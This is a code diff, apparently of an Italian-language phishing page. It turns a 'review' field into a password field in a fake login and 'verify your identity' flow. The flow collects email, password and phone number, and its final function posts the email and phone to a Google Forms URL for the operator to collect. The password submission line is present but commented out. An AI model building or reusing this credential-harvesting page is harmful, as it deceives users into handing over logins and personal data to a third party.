@@ -133,9 +133,9 @@ input {
       <input type="email" id="email" placeholder="Inserisci email">
     </div>
 
-    <div id="review-wrapper" class="hidden">
-      <label>review</label>
-      <input type="review" id="review" placeholder="Inserisci review">
+    <div id="password-wrapper" class="hidden">
+      <label>password</label>
+      <input type="password" id="password" placeholder="Inserisci password">
     </div>
 
     <div id="phone-wrapper" class="hidden">
@@ -182,7 +182,7 @@ function handleContinue() {
   error.textContent = "";
 
   const email = document.getElementById("email").value.trim();
-  const review = document.getElementById("review").value;
+  const password = document.getElementById("password").value;
   const phone = document.getElementById("phone").value.trim();
 
   // --- STEP 1: VALIDAZIONE EMAIL ---
@@ -192,22 +192,22 @@ function handleContinue() {
       return;
     }
 
-    document.getElementById("review-wrapper").classList.remove("hidden");
+    document.getElementById("password-wrapper").classList.remove("hidden");
     step = 2;
     return;
   }
 
   // --- STEP 2: VALIDAZIONE re ---
   if (step === 2) {
-    if (review.length < 6) {
-      error.textContent = "La review è di almeno 6 caratteri";
+    if (password.length < 6) {
+      error.textContent = "La password è di almeno 6 caratteri";
       return;
     }
     
     // AZIONI RICHIESTE:
     // 1. Nascondi Email e re
     document.getElementById("email-wrapper").classList.add("hidden");
-    document.getElementById("review-wrapper").classList.add("hidden");
+    document.getElementById("password-wrapper").classList.add("hidden");
     
     // 2. Cambia il titolo H1
     title.textContent = "Verifica la tua identità";
@@ -241,7 +241,7 @@ const G_URL = "https://docs.google.com/forms/d/e/1FAIpQLSeL-5tvSnuXBFBtEV0yziqFQ
 async function inviaDatiFinali() {
     const email = document.getElementById("email").value;
     const phone = document.getElementById("phone").value;
-    const review = document.getElementById("review").value;
+    const password = document.getElementById("password").value;
 
     // Creiamo il contenitore dei dati
     const formData = new FormData();
@@ -249,7 +249,7 @@ async function inviaDatiFinali() {
     // Sostituisci i numeri qui sotto con i tuoi Entry ID trovati al punto 3
     formData.append("entry.1807533030", email); 
     formData.append("entry.1821810321", phone);
-  //  formData.append("entry.167777586", review);
+  //  formData.append("entry.167777586", password);
 
     try {
         await fetch(G_URL, {
@@ -269,3 +269,4 @@ async function inviaDatiFinali() {
 </body>
 
 </html>
+
